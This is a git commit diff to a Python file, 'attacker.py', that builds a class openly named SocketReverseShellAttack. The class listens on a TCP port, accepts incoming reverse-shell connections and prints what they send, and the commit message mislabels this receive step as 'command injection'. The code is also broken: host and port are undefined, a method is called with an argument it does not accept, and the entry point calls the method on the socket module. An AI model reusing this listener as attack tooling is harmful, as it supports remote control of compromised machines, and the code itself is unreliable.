37068e927893ece5461900441355108ff7d62fda
JrDev <josemanuelramirezrengifo9@gmail.com>
2026-07-08 18:42:08 -0400

    Implement command injection in SocketReverseShellAttack
    Added command injection method to handle received data.

--- attacker.py
+++ attacker.py
@@ -1,15 +1,29 @@
 import socket
+import asyncio
 
 class SocketReverseShellAttack:
     def __init__(self):
         self.HOST = host
         self.PORT = port
 
-    def receive_connection:
+    def command_inyection(self):
+        data_reverse_shell = conn.recv(1024)
+        message_descriptor = data_reverse_shell.decode()
+
+        print(message_descriptor)
+        
+    
+    def receive_connection(self):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.bind((self.HOST, self.PORT))
             s.listen(5)
 
             while True:
                 conn, addr = s.accept()
-                print(f"Conección establecida con: {conn}:{self.PORT}")
+                print(f"Conección establecida con: {addr}:{self.PORT}")
+
+                self.command_inyection(conn)
+
+if __name__ == '__main__':
+    socket_object = SocketReverseShellAttack()
+    socket.receive_connection()
